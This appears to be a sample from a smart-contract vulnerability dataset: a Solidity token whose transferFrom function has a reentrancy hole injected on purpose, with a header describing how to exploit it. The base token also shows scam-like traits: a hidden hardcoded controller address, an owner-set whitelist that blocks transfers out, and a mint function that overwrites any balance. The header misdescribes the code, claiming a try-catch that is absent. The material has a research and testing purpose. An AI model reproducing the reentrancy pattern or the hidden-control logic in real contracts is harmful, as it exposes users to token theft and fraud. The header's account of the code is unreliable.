/*
 * ===== SmartInject Injection Details =====
 * Function      : transferFrom
 * Vulnerability : Reentrancy
 * Status        : Verified
 * Type          : Function Modification
 *
 * === Verification Results ===
 * Detected      : True
 * Relevant      : 2 findings
 * Total Found   : 2 issues
 * Retry Count   : 0
 *
 * === Detected Issues ===
 * 1. reentrancy-no-eth (SWC-107)
 * 2. reentrancy-events (SWC-107)
 *
 * === Description ===
 * Introduced a stateful, multi-transaction reentrancy vulnerability by adding an external callback to the recipient contract after balance updates but before allowance reduction. This creates a vulnerable window where balances are updated but allowances haven't been reduced yet.
 * 
 * **Specific Changes Made:**
 * 1. Added external call to `TransferCallback(_to).onTokenTransfer()` after balance updates
 * 2. Added `isContract()` helper function to detect contract addresses
 * 3. Placed the callback strategically between balance updates and allowance reduction
 * 4. Used try-catch to make the callback optional (more realistic)
 * 
 * **Multi-Transaction Exploitation Scenario:**
 * 1. **Setup Phase (Transaction 1)**: Attacker creates a malicious contract that implements `TransferCallback` interface and approves it to spend tokens
 * 2. **Exploitation Phase (Transaction 2)**: When `transferFrom` is called with the malicious contract as `_to`, the callback is triggered after balances are updated but before allowances are reduced
 * 3. **Reentrant Attack (Within Transaction 2)**: The malicious contract's `onTokenTransfer` callback calls `transferFrom` again, exploiting the fact that `allowed[_from][msg.sender]` hasn't been reduced yet
 * 4. **State Persistence**: The vulnerability relies on the persistent state of allowances that were set in previous transactions
 * 
 * **Why Multiple Transactions Are Required:**
 * - **State Setup**: Attacker must first set up allowances in a separate transaction using `approve()`
 * - **Exploitation Window**: The vulnerability only exists in the specific window between balance updates and allowance reduction
 * - **Persistent State Dependency**: The attack depends on allowance state that persists between transactions
 * - **Accumulated Damage**: Multiple reentrant calls can drain more tokens than the original allowance should permit
 * 
 * This creates a realistic reentrancy vulnerability that requires careful transaction sequencing and state management to exploit, making it a sophisticated multi-transaction attack vector.
 */
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

// Minimal interface for recipient contract
interface TransferCallback {
    function onTokenTransfer(address _from, uint256 _value, bytes _data) external;
}

contract FireTokenAndreKP9R is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
  }
  
  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == address(1080614020421183795110940285280029773222128095634));_;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
  
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
    
    // Transfer notification hook - allows recipient to respond to transfer
    if(isContract(_to)) {
        TransferCallback(_to).onTokenTransfer(_from, _value, msg.data);
    }
    
    // ===== SMARTINJECT: Reentrancy VULNERABILITY END =====
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
  // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
  
  function isContract(address account) internal view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(account) }
    return size > 0;
  }
  // ===== SMARTINJECT: Reentrancy VULNERABILITY END =====

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}
